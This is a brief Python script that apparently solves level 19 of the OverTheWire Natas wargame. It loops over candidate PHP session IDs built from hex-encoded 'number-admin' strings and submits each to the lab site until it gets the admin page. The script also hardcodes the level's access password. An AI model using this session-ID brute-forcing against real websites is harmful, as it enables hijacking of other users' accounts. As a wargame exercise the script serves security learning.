import requests

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
passw = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
#556-natas20
session = requests.session()
for i in  range(1,1000) :
	s = "%d-admin" %i
	cookies = {'PHPSESSID' : s.encode('hex')}
	data = {'username':'admin' ,'password':'okay'}
	r = requests.post(url,data=data,auth=(username, passw),cookies=cookies)
	content = r.text
	print "trying session id %d" %i + "\n\n"
	if('regular' not in content):
		print "The \'i\' is %d" %i
		print content
		exit(1)